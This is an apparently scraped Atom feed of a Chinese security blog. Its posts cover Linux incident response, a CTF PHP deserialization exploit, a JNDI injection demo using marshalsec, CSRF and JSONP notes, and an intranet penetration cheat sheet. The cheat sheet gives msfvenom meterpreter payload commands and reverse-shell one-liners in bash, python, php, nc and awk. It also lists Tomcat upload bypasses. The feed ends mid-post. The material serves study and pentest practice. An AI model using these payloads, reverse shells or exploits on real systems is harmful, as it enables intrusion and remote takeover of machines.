<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>prontosil&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://prontosil.com/"/>
  <updated>2020-04-03T09:51:50.772Z</updated>
  <id>http://prontosil.com/</id>
  
  <author>
    <name>prontosil</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>反弹shell检测思路</title>
    <link href="http://prontosil.com/posts/d7bd6781/"/>
    <id>http://prontosil.com/posts/d7bd6781/</id>
    <published>2020-04-03T09:51:50.000Z</published>
    <updated>2020-04-03T09:51:50.772Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Linux应急响应</title>
    <link href="http://prontosil.com/posts/e756113b/"/>
    <id>http://prontosil.com/posts/e756113b/</id>
    <published>2020-04-03T09:08:25.000Z</published>
    <updated>2020-04-03T14:27:20.525Z</updated>
    
    <content type="html"><![CDATA[<h2 id="相关命令补充"><a href="#相关命令补充" class="headerlink" title="相关命令补充"></a>相关命令补充</h2><h2 id="入侵排查思路"><a href="#入侵排查思路" class="headerlink" title="入侵排查思路"></a>入侵排查思路</h2><h3 id="账号安全"><a href="#账号安全" class="headerlink" title="账号安全"></a>账号安全</h3><p>用户信息文件/etc/passwd</p><pre><code>root:x:0:0:root:/root:/bin/bashaccount:password:UID:GID:GECOS:directory:shell用户名：密码：用户ID：组ID：用户说明：家目录：登陆之后shell</code></pre><p>注意：无密码只允许本机登陆，远程不允许登陆</p><p><code>/etc/shadow</code> 文件</p><pre><code>root:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/:16809:0:99999:7:::用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之后的宽限天数：账号失效时间：保留</code></pre><p>相关命令</p><pre><code>who   查看当前登录用户（tty本地登陆 pts远程登录）w    查看系统信息，想知道某一时刻用户的行为uptime 查看登陆多久、多少用户，负载</code></pre><p>查找特权用户(UID=0)</p><pre><code>awk -F: &#39;$3==0{print $1}&#39; /etc/passwd</code></pre><p>查找可以远程登陆的账号信息</p><pre><code>$ sudo awk &#39;/\$1|\$6/{print $1}&#39; /etc/shadowroot:$6$ogEENApZAzc/p2XN$TQ.P2pRw7IwUuYPMXymUH2fbGNrNqJutxiao3xAJpCSYlhjNCL1BYByO1W75i4I6ri1GWGu61VMqexIXw5s0l.:18298:0:99999:7:::pxy:$6$7LQL0eO/Dk93UKqU$U9fSZEej9Dx1/InOImWFsfRdtWW2dJHzWYhnBRJj79.NLVQ9og.5E0jAo7eYB.vmwR9PuYjND.e4yBWwhqVvq.:18253:0:99999:7:::</code></pre><p>除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</p><pre><code>sudo more /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;</code></pre><p>禁用或者删除可疑的账号</p><pre><code>usermod -L user  禁用帐号，帐号无法登录，/etc/shadow第二栏为!开头userdel user    删除user用户userdel -r user  将删除user用户，并且将/home目录下的user目录一并删除</code></pre><h3 id="历史命令"><a href="#历史命令" class="headerlink" title="历史命令"></a>历史命令</h3><ul><li><p><code>history</code> 查看历史命令</p></li><li><p>打开/home各帐号目录下的.bash_history，查看普通帐号的历史命令</p></li></ul><p>保存一万条命令</p><pre><code>sed -i &#39;s/^HISTSIZE=1000/HISTSIZE=10000/g&#39; /etc/profile</code></pre><p>增加ip信息</p><pre><code class="bash">######jiagu history xianshi#########USER_IP=`who -u am i 2&gt;/dev/null | awk &#39;{print $NF}&#39; | sed -e &#39;s/[()]//g&#39;`if [ &quot;$USER_IP&quot; = &quot;&quot; ]thenUSER_IP=`hostname`fiexport HISTTIMEFORMAT=&quot;%F %T $USER_IP `whoami` &quot;shopt -s histappendexport PROMPT_COMMAND=&quot;history -a&quot;######### jiagu history xianshi ##########</code></pre><p><code>source /etc/profile</code> 让配置生效</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;相关命令补充&quot;&gt;&lt;a href=&quot;#相关命令补充&quot; class=&quot;headerlink&quot; title=&quot;相关命令补充&quot;&gt;&lt;/a&gt;相关命令补充&lt;/h2&gt;&lt;h2 id=&quot;入侵排查思路&quot;&gt;&lt;a href=&quot;#入侵排查思路&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://prontosil.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="Linux" scheme="http://prontosil.com/tags/Linux/"/>
    
      <category term="应急响应" scheme="http://prontosil.com/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>无参RCE构造</title>
    <link href="http://prontosil.com/posts/d6a47f52/"/>
    <id>http://prontosil.com/posts/d6a47f52/</id>
    <published>2020-04-02T00:23:56.000Z</published>
    <updated>2020-04-02T23:18:35.551Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>反序列化题目整理</title>
    <link href="http://prontosil.com/posts/4e7aaa07/"/>
    <id>http://prontosil.com/posts/4e7aaa07/</id>
    <published>2020-04-01T10:34:33.000Z</published>
    <updated>2020-04-03T10:40:18.628Z</updated>
    
    <content type="html"><![CDATA[<h2 id="qwb-upload"><a href="#qwb-upload" class="headerlink" title="qwb upload"></a>qwb upload</h2><p>当初学的时候挺难的，现在做起来觉得挺简单了</p><p>入口 <code>Register.php</code></p><pre><code class="php">    public function __destruct()    {        if(!$this-&gt;registed){            $this-&gt;checker-&gt;index();        }    }</code></pre><p>调用 <code>checker</code> 属性的 index 方法，如果不存在，就会调用某个类的 <code>__call</code> 方法</p><p>正好有一个 <code>Profile.php</code> </p><pre><code class="php">    public function __get($name)    {        return $this-&gt;except[$name];    }    public function __call($name, $arguments)    {        if($this-&gt;{$name}){            $this-&gt;{$this-&gt;{$name}}($arguments);        }    }</code></pre><p>那么就可以通过 <code>__call</code> 去调用其他的方法了，这里我们选择</p><pre><code class="php">    public function upload_img(){        if($this-&gt;checker){            if(!$this-&gt;checker-&gt;login_check()){                $curr_url=&quot;http://&quot;.$_SERVER[&#39;HTTP_HOST&#39;].$_SERVER[&#39;SCRIPT_NAME&#39;].&quot;/index&quot;;                $this-&gt;redirect($curr_url,302);                exit();            }        }        if(!empty($_FILES)){            $this-&gt;filename_tmp=$_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];            $this-&gt;filename=md5($_FILES[&#39;upload_file&#39;][&#39;name&#39;]).&quot;.png&quot;;            $this-&gt;ext_check();        }        if($this-&gt;ext) {            if(getimagesize($this-&gt;filename_tmp)) {                @copy($this-&gt;filename_tmp, $this-&gt;filename);                @unlink($this-&gt;filename_tmp);                $this-&gt;img=&quot;../upload/$this-&gt;upload_menu/$this-&gt;filename&quot;;                $this-&gt;update_img();            }else{                $this-&gt;error(&#39;Forbidden type!&#39;, url(&#39;../index&#39;));            }        }else{            $this-&gt;error(&#39;Unknow file type!&#39;, url(&#39;../index&#39;));        }    }</code></pre><p><code>checker</code> 属性可控，<code>ext</code> 属性可控</p><p>进入到 <code>@copy($this-&gt;filename_tmp, $this-&gt;filename);</code> 即可将图片马改名</p><blockquote><p>这题复盘的时候比较玄学，挺难成功的</p></blockquote><p>调试过程</p><p><img src="/posts/4e7aaa07/1585910353276.png" alt></p><p>之后即可修改文件名</p><p><img src="/posts/4e7aaa07/1585910388138.png" alt></p><p>exp</p><pre><code class="php">&lt;?phpnamespace app\web\controller;use think\Controller;class Register{    public $checker;    public $registed = false;    public function __construct($checker){        $this-&gt;checker = $checker;    }}class Profile{   # 先上传一个图片马shell.png，保存路径为/upload/md5($_SERVER[&#39;REMOTE_ADDR&#39;])/md5($_FILES[&#39;upload_file&#39;][&#39;name&#39;]).&quot;.png&quot;    public $filename_tmp = &#39;./upload/2e25bf05f23b63a5b1f744933543d723/00bf23e130fa1e525e332ff03dae345d.png&#39;;    public $filename = &#39;./upload/2e25bf05f23b63a5b1f744933543d723/shell.php&#39;;    public $ext = true;    public $except = array(&#39;index&#39; =&gt; &#39;upload_img&#39;);}$register = new Register(new Profile());echo urlencode(base64_encode(serialize($register)));</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;qwb-upload&quot;&gt;&lt;a href=&quot;#qwb-upload&quot; class=&quot;headerlink&quot; title=&quot;qwb upload&quot;&gt;&lt;/a&gt;qwb upload&lt;/h2&gt;&lt;p&gt;当初学的时候挺难的，现在做起来觉得挺简单了&lt;/p&gt;
&lt;p&gt;入口 &lt;code&gt;
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://prontosil.com/categories/CTF/"/>
    
    
      <category term="POP" scheme="http://prontosil.com/tags/POP/"/>
    
  </entry>
  
  <entry>
    <title>jndi入门</title>
    <link href="http://prontosil.com/posts/fe658142/"/>
    <id>http://prontosil.com/posts/fe658142/</id>
    <published>2020-03-22T08:52:41.000Z</published>
    <updated>2020-03-22T10:52:15.312Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>JNDI(Java Naming and Directory Interface),名为 Java命名和目录接口，JNDI是Java API，允许客户端通过名称发现和查找数据、对象。这些对象可以存储在不同的命名或目录服务中，例如远程方法调用（RMI），公共对象请求代理体系结构（CORBA），轻型目录访问协议（LDAP）或域名服务（DNS）。放两张直观的图</p><p><img src="/posts/fe658142/1.png" alt></p><p>从图中可以看出，JNDI相当于是更进一步的封装</p><p>JNDI自身并不区分客户端和服务器端，也不具备远程能力，但是被其协同的一些其他应用一般都具备远程能力，JNDI在客户端和服务器端都能够进行一些工作，客户端上主要是进行各种访问，查询，搜索，而服务器端主要进行的是帮助管理配置，也就是各种bind。比如在RMI服务器端上可以不直接使用Registry进行bind，而使用JNDI统一管理，当然JNDI底层应该还是调用的Registry的bind，但好处JNDI提供的是统一的配置接口；在客户端也可以直接通过类似URL的形式来访问目标服务，</p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><pre><code class="java">/** * @description: * @author: Pxy * @create: 2020-03-22 16:34 **/import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;import javax.naming.Context;import javax.naming.InitialContext;import javax.naming.NamingException;import javax.naming.spi.NamingManager;public class test {    public static void initPerson() throws Exception{        //配置JNDI工厂和JNDI的url和端口。如果没有配置这些信息，会出现NoInitialContextException异常        LocateRegistry.createRegistry(3001);        System.setProperty(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);        System.setProperty(Context.PROVIDER_URL, &quot;rmi://localhost:3001&quot;);        ////初始化        InitialContext ctx = new InitialContext();        //实例化person对象        Person p = new Person();        p.setName(&quot;pxy&quot;);        p.setPassword(&quot;12345&quot;);        //person对象绑定到JNDI服务中，JNDI的名字叫做：person，即我们可以通过person键值，来对Person对象进行索引        ctx.bind(&quot;person&quot;, p);        ctx.close();    }    public static void findPerson() throws Exception{        //因为前面已经将JNDI工厂和JNDI的url和端口已经添加到System对象中，这里就不用在绑定了        InitialContext ctx = new InitialContext();        //通过lookup查找person对象        Person person = (Person) ctx.lookup(&quot;person&quot;);        System.out.println(person.toString());//        ctx.lookup(&quot;rmi://127.0.0.1:1099/Exploit&quot;);        ctx.close();    }    public static void main(String[] args) throws Exception {        initPerson();        findPerson();    }}</code></pre><p>首先生成一个工厂，然后将对象绑定上，再去访问</p><p><img src="/posts/fe658142/1584867587547.png" alt></p><h2 id="JNDI协议动态转换"><a href="#JNDI协议动态转换" class="headerlink" title="JNDI协议动态转换"></a>JNDI协议动态转换</h2><p>上面的Demo里面，在初始化就预先指定了其上下文环境(RMI),但是在调用 lookup() 时，是可以使用带 URI 动态的转换上下文环境，例如上面已经设置了当前上下文会访问 RMI 服务，那么可以直接使用 RMi的 URI 格式去<strong>转换</strong>(该变)上下文环境，使之访问 RMI 服务上的绑定对象：</p><pre><code class="java">Person person = (Person) ctx.lookup(&quot;rmi://localhost:3001/person&quot;);</code></pre><h2 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h2><p>那么如果 <code>lookup</code> 的参数可控呢？</p><p>比如将其改为</p><pre><code>ctx.lookup(&quot;rmi://127.0.0.1:1099/Exploit&quot;);</code></pre><p>Exploit.java</p><pre><code class="java">/** * @description: * @author: Pxy * @create: 2020-03-22 16:37 **/public class Exploit {    static {        try {            Runtime rt = Runtime.getRuntime();            String[] commands = {&quot;calc.exe&quot;};            Process pc = rt.exec(commands);            pc.waitFor();        } catch (Exception e) {            // do nothing        }    }}</code></pre><p>编译好之后，放到一个web目录下</p><p><img src="/posts/fe658142/1584867473029.png" alt></p><p>然后开启RMI服务</p><pre><code>java.exe -cp .\marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://127.0.0.1:8002/#Exploit 1099</code></pre><p><img src="/posts/fe658142/1584867499037.png" alt></p><p>运行即可弹出计算器</p><p><img src="/posts/fe658142/1584867538545.png" alt></p><p><img src="/posts/fe658142/1584867555946.png" alt></p><blockquote><p>在调试的时候遇到了一个问题，java版本不兼容，由于我电脑上存在java7和java8，会报错</p><p><img src="/posts/fe658142/1584867717633.png" alt></p><p><a href="https://stackoverflow.com/questions/22489398/unsupported-major-minor-version-52-0" target="_blank" rel="noopener">https://stackoverflow.com/questions/22489398/unsupported-major-minor-version-52-0</a></p></blockquote><h2 id="spring-JNDI注入"><a href="#spring-JNDI注入" class="headerlink" title="spring JNDI注入"></a>spring JNDI注入</h2><p>利用链：</p><p><code>JtaTransactionManager</code></p><p><img src="/posts/fe658142/1584868292042.png" alt></p><p>跟进 <code>initUserTransactionAndTransactionManager</code></p><p><img src="/posts/fe658142/1584874126510.png" alt></p><p>继续跟进 <code>lookupUserTransaction</code> 方法</p><p><img src="/posts/fe658142/1584874158465.png" alt></p><p>可以看到调用了lookup,而且我们可以看到整个调用链只要我们可控<code>userTransactionName</code>就可以,</p><p><img src="/posts/fe658142/1584874198634.png" alt></p><p>调用链比较简单，最后控制属性即可</p><pre><code class="java">org.springframework.transaction.jta.JtaTransactionManager object = new org.springframework.transaction.jta.JtaTransactionManager();object.setUserTransactionName(jndiAddress);</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;基本概念&quot;&gt;&lt;a href=&quot;#基本概念&quot; class=&quot;headerlink&quot; title=&quot;基本概念&quot;&gt;&lt;/a&gt;基本概念&lt;/h2&gt;&lt;p&gt;JNDI(Java Naming and Directory Interface),名为 Java命名和目录接口，JNDI是
      
    
    </summary>
    
    
      <category term="代码审计" scheme="http://prontosil.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="jndi" scheme="http://prontosil.com/tags/jndi/"/>
    
  </entry>
  
  <entry>
    <title>CSRF相关总结</title>
    <link href="http://prontosil.com/posts/f70b79f3/"/>
    <id>http://prontosil.com/posts/f70b79f3/</id>
    <published>2020-03-19T07:27:00.000Z</published>
    <updated>2020-03-19T15:11:52.177Z</updated>
    
    <content type="html"><![CDATA[<p>刚开始想写这篇文章的时候有点纠结分类，感觉归类到CTF不是很好，因为在CTF中就没遇到过，归类到渗透测试呢，又感觉不太对23333，算了还是丢到渗透测试吧</p><h2 id="同源策略-SOP"><a href="#同源策略-SOP" class="headerlink" title="同源策略(SOP)"></a>同源策略(SOP)</h2><p>SOP影响范围包括：普通的HTTP请求、XMLHttpRequest、XSLT、XBL。</p><p>同源是指，<strong>域名，协议，端口相同</strong></p><p>跨域的种类</p><ul><li>协议不同</li><li>端口不同</li><li>主域名不同</li><li>子域名不同</li></ul><p>允许跨域的标签</p><pre><code>&lt;script src=&quot;...&quot;&gt;&lt;/script&gt;&lt;img src=&quot;...&quot;&gt;&lt;video src=&quot;...&quot;&gt;&lt;/video&gt;&lt;audio src=&quot;...&quot;&gt;&lt;/audio&gt;&lt;embed src=&quot;...&quot;&gt;&lt;frame src=&quot;...&quot;&gt;&lt;iframe src=&quot;...&quot;&gt;&lt;/iframe&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;...&quot;&gt;&lt;applet code=&quot;...&quot;&gt;&lt;/applet&gt;&lt;object data=&quot;...&quot; &gt;&lt;/object&gt;</code></pre><p>同源策略虽然感觉很陌生，但确实前端的基石，地位类似于在牛顿定律在力学中的地位</p><p>试想没有同源策略的话，那么任何一个网页都可以随意操控其他网页的数据，那真的是web世界的灾难。就像牛顿定律如果失效，估计地球都不知道怎么绕太阳转了</p><p><strong>重点：</strong></p><p><strong>跨域并不是请求发不出去，请求能发出去，服务端能收到请求并正常返回结果，只是结果被浏览器拦截了</strong>。你可能会疑问明明通过表单的方式可以发起跨域请求，为什么 Ajax 就不会?因为归根结底，跨域是为了阻止用户读取到另一个域名下的内容，Ajax 可以获取响应，浏览器认为这不安全，所以拦截了响应。但是表单并不会获取新的内容，所以可以发起跨域请求。同时也说明了跨域并不能完全阻止 CSRF，因为请求毕竟是发出去了。</p><h2 id="如何跨域？"><a href="#如何跨域？" class="headerlink" title="如何跨域？"></a>如何跨域？</h2><p>跨域是必须的，因为同源策略的限制太严格了，子域名居然也和域名不同源！</p><ol><li>设置window.domain</li></ol><p>浏览器允许通过设置 <code>document.domain</code> 来共享cookie</p><ol start="2"><li>cookie本身的domain属性</li></ol><p>cookie本身可以设置 <code>domain</code> 属性，指定Cookie的所属域名为一级域名，比如<code>.example.com</code>。那么二级和三级域名也可以读取到cookie    </p><h3 id="jsonp跨域"><a href="#jsonp跨域" class="headerlink" title="jsonp跨域"></a>jsonp跨域</h3><p>声明一个回调函数，其函数名(如show)当做参数值，要传递给跨域请求数据的服务器，函数形参为要获取目标数据(服务器返回的data)。</p><p>创建一个<code>&lt;script&gt;</code>标签，把那个跨域的API数据接口地址，赋值给script的src,还要在这个地址中向服务器传递该函数名（可以通过问号传参:?callback=show）。</p><p>服务器接收到请求后，需要进行特殊的处理：把传递进来的函数名和它需要给你的数据拼接成一个字符串,例如：传递进去的函数名是show，它准备好的数据是<code>show(&#39;我不爱你&#39;)</code>。</p><p>最后服务器把准备的数据通过HTTP协议返回给客户端，客户端再调用执行之前声明的回调函数（show），对返回的数据进行操作。</p><p>一个典型的jsonp攻击的代码</p><pre><code class="js">&lt;script&gt;function wooyun(v){    alert(v.username);}&lt;/script&gt;&lt;script src=&quot;http://js.login.360.cn/?o=sso&amp;m=info&amp;func=wooyun&quot;&gt;&lt;/script&gt;</code></pre><p>发送请求过去之后，服务端返回了数据，然后就被弹出来了</p><p>遇到过的一个CTF题目</p><pre><code>&lt;script/src=&amp;unit=https://www.google.com/complete/search?client=chrome&amp;q=hello&amp;callback=alert&gt;&lt;/script&gt;</code></pre><h4 id="防御jsonp攻击"><a href="#防御jsonp攻击" class="headerlink" title="防御jsonp攻击"></a>防御jsonp攻击</h4><p>验证 JSON 文件调用的来源（ Referer ）。这个方案是主要利用了 <code>&lt;script&gt;</code> 远程加载 JSON 文件时会发送 Referer ，在网站输出 JSON 数据时判断 Referer 是不是白名单合法的就可以进行防御！这个方法是可行的</p><ol><li>正则过滤不严谨</li><li>空referer</li></ol><h3 id="CORS-跨域资源共享"><a href="#CORS-跨域资源共享" class="headerlink" title="CORS 跨域资源共享"></a>CORS 跨域资源共享</h3><p>允许浏览器向跨源服务器，发出<a href="http://www.ruanyifeng.com/blog/2012/09/xmlhttprequest_level_2.html" target="_blank" rel="noopener"><code>XMLHttpRequest</code></a>请求，从而克服了AJAX只能<a href="http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html" target="_blank" rel="noopener">同源</a>使用的限制。</p><p>区分简单请求和非简单请求：</p><pre><code>（1) 请求方法是以下三种方法之一：HEADGETPOST（2）HTTP的头信息不超出以下几种字段：AcceptAccept-LanguageContent-LanguageLast-Event-IDContent-Type：只限于三个值application/x-www-form-urlencoded、multipart/form-data、text/plain</code></pre><p>满足以上要求即是简单请求</p><p>重点在最后一句： </p><blockquote><p>Content-Type：只限于三个值application/x-www-form-urlencoded、multipart/form-data、text/plain</p></blockquote><p>对于简单请求，浏览器直接发出CORS请求。具体来说，就是在头信息之中，增加一个<code>Origin</code>字段。这个字段用来说明，本次请求来自哪个源（协议 + 域名 + 端口）。服务器根据这个值，决定是否同意这次请求。</p><p>如果<code>Origin</code>指定的域名在许可范围内，服务器返回的响应，会多出几个头信息字段。</p><pre><code>Access-Control-Allow-Origin: http://api.bob.comAccess-Control-Allow-Credentials: trueAccess-Control-Expose-Headers: FooBarContent-Type: text/html; charset=utf-8</code></pre><p>Access-Control-Allow-Origin： 要么是 origin 的值，要么就是 *</p><p>Access-Control-Allow-Credentials: 它的值是一个布尔值，表示是否允许发送Cookie。如果不要的话就删除这个字段</p><p>Access-Control-Expose-Headers：如果想拿到其他字段，就必须在<code>Access-Control-Expose-Headers</code>里面指定。</p><p>CORS请求默认不发送Cookie和HTTP认证信息。如果要把Cookie发到服务器，一方面要服务器同意，指定<code>Access-Control-Allow-Credentials</code>字段。</p><h2 id="cookie属性"><a href="#cookie属性" class="headerlink" title="cookie属性"></a>cookie属性</h2><p>cookie的五大属性:“path, domain, expire, HttpOnly, Secure”，很少有人了解到cookie还有一个SameSite属性，这是一个专门用于防止csrf漏洞的属性。</p><ol><li>http-only:</li></ol><p>浏览器会禁止页面中的 JavaScript 访问带有 HttpOnly 属性的 Cookie</p><ol start="2"><li>domain</li></ol><p>domain标识域，如域A为t1.test.com，域B为t2.test.com，那么在域A生产一个令域A和域B都能访问的cookie就要将该cookie的domain设置为.test.com</p><ol start="3"><li>expire</li></ol><p>过期时间</p><ol start="4"><li>Secure</li></ol><p>当设置为true时，表示创建的 Cookie 会被以安全的形式向服务器传输，也就是只能在 HTTPS 连接中被浏览器传递到服务器端进行会话验证，如果是 HTTP 连接则不会传递该信息，所以不会被窃取到Cookie 的具体内容。</p><ol start="5"><li>path</li></ol><p>path表示cookie所在的目录</p><h3 id="cookie分类"><a href="#cookie分类" class="headerlink" title="cookie分类"></a>cookie分类</h3><h2 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h2><h3 id="samsite属性"><a href="#samsite属性" class="headerlink" title="samsite属性"></a>samsite属性</h3><p>面试真实问题：vue开发的前后端项目如何避免CSRF？</p><p>查到的解决方案：</p><ol><li>如果后端用Django开发，可以通过传递CSRF token过来</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;刚开始想写这篇文章的时候有点纠结分类，感觉归类到CTF不是很好，因为在CTF中就没遇到过，归类到渗透测试呢，又感觉不太对23333，算了还是丢到渗透测试吧&lt;/p&gt;
&lt;h2 id=&quot;同源策略-SOP&quot;&gt;&lt;a href=&quot;#同源策略-SOP&quot; class=&quot;headerlink
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://prontosil.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="CSRF" scheme="http://prontosil.com/tags/CSRF/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透常见知识</title>
    <link href="http://prontosil.com/posts/6941c9ee/"/>
    <id>http://prontosil.com/posts/6941c9ee/</id>
    <published>2020-03-18T01:09:58.000Z</published>
    <updated>2020-03-18T08:31:08.179Z</updated>
    
    <content type="html"><![CDATA[<h2 id="msf常用命令"><a href="#msf常用命令" class="headerlink" title="msf常用命令"></a>msf常用命令</h2><h3 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h3><p>参数：</p><ul><li><p><code>-l</code> 列出相关的值，这些值包括 <code>payloads, encoders, nops, platforms, archs, encrypt, formats, all</code></p></li><li><p><code>-b</code> badchar 参数被设置的时候，它的值中描述的字符将会被避免出现在 Payload 中</p></li><li><p><code>-e</code> 开启payload编码</p></li></ul><pre><code>msfvenom -l encoders 列出所有的编码器</code></pre><p>其中比较强大的有：</p><p><code>x86/shikata_ga_nai, cmd/powershell_base64</code></p><ul><li><code>-i</code> 指定编码次数</li><li><code>-x</code> 指定一个特定的可执行文件作为模板，常与 <code>-k</code> 联合使用，保护模板程序的功能，注入的payload作为一个新的进程运行</li><li><code>-n</code> 指定填充的nop数量</li></ul><h3 id="常用payload生成命令"><a href="#常用payload生成命令" class="headerlink" title="常用payload生成命令"></a>常用payload生成命令</h3><p>Windows (避免坏字节的出现)</p><pre><code>msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcpLHOST=攻击机IP LPORT=攻击机端口 -e x86/shikata_ga_nai -b &#39;\x00\x0a\xff&#39; -i 3 -f exe -o payload.exe</code></pre><p>Android</p><pre><code>//需要签名msfvenom -a x86 --platform Android -p android/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f apk -o payload.apk</code></pre><p>powershell</p><pre><code>msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -e cmd/powershell_base64 -i 3 -f raw -o payload.ps1</code></pre><p>Linux</p><pre><code>msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f elf -o payload.elf</code></pre><p>php</p><pre><code>msfvenom -p php/meterpreter_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw &gt; shell.php</code></pre><p>war</p><pre><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw - o payload.war</code></pre><p>war包和jar包区别：</p><blockquote><p>war包是java web打的包，可以直接丢到tomcat的webapp目录下运行，jar包是java应用程序打的包，像spring boot打包就是jar，因为内置了web服务器</p></blockquote><p>python</p><pre><code>msfvenom -p python/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.py</code></pre><p>Windows shellcode</p><pre><code>msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f c</code></pre><p>Linux shellcode</p><pre><code>msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f c</code></pre><h2 id="常用反弹shell"><a href="#常用反弹shell" class="headerlink" title="常用反弹shell"></a>常用反弹shell</h2><p>github项目：<a href="https://github.com/m0rph-1/revshellgen" target="_blank" rel="noopener">https://github.com/m0rph-1/revshellgen</a> 可以很方便地生成各种形式的反弹shell命令</p><p>bash反弹shell</p><pre><code>~/revshellgen (master ✔) ᐅ python revshellgen.py -i 127.0.0.1 -p 1234 -t bash[+] Reverse shell command:bash -i &gt;&amp; /dev/tcp/127.0.0.1/1234 0&gt;&amp;1</code></pre><p>python反弹shell</p><pre><code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code></pre><p>php反弹shell</p><pre><code>php -r &#39;$sock=fsockopen(&quot;127.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></pre><p>nc反弹shell</p><pre><code>ncat 127.0.0.1 1234 -e /bin/shrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 127.0.0.1 1234 &gt;/tmp/f</code></pre><p>awk反弹shell</p><pre><code>awk &#39;BEGIN {s = &quot;/inet/tcp/0/127.0.0.1/1234&quot;; while(42) { do{ printf &quot;shell&gt;&quot; |&amp; s; s |&amp; getline c; if(c){ while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); } } while(c != &quot;exit&quot;) close(s); }}&#39; /dev/null</code></pre><p>nc-pipe</p><pre><code>/bin/sh | nc 127.0.0.1 1234</code></pre><h2 id="tomcat常见漏洞"><a href="#tomcat常见漏洞" class="headerlink" title="tomcat常见漏洞"></a>tomcat常见漏洞</h2><h3 id="Tomcat-PUT方法任意写文件漏洞（CVE-2017-12615）"><a href="#Tomcat-PUT方法任意写文件漏洞（CVE-2017-12615）" class="headerlink" title="Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）"></a>Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）</h3><p><code>/conf/web.xml</code> 文件中的readonly为false</p><pre><code>&lt;init-param&gt;    &lt;param-name&gt;readonly&lt;/param-name&gt;    &lt;param-value&gt;false&lt;/param-value&gt;&lt;/init-param&gt;</code></pre><p>之后就可以通过PUT方式上传文件，但是 <code>.jsp</code> 的后缀会被限制</p><p>绕过方式：</p><ul><li>Windows文件名加空格 <code>PUT /x.jsp%20 HTTP/1.1</code> 上传之后在Windows下空格会被去掉</li><li>NTFS流， <code>PUT /x.jsp::$DATA HTTP/1.1</code></li><li><code>/</code>在文件名中是非法的，也会被去除（Linux/Windows) <code>PUT /x.jsp/ HTTP/1.1</code></li></ul><h3 id="tomcat-后台部署war包漏洞"><a href="#tomcat-后台部署war包漏洞" class="headerlink" title="tomcat 后台部署war包漏洞"></a>tomcat 后台部署war包漏洞</h3><p><code>tomcat-users.xml</code> 修改配置</p><pre><code>&lt;role rolename=&quot;manager-gui&quot;/&gt;&lt;role rolename=&quot;admin-gui&quot;/&gt;&lt;user username=&quot;tomcat&quot; password=&quot;admin&quot; roles=&quot;manager-gui,admin-gui&quot;/&gt;&lt;user 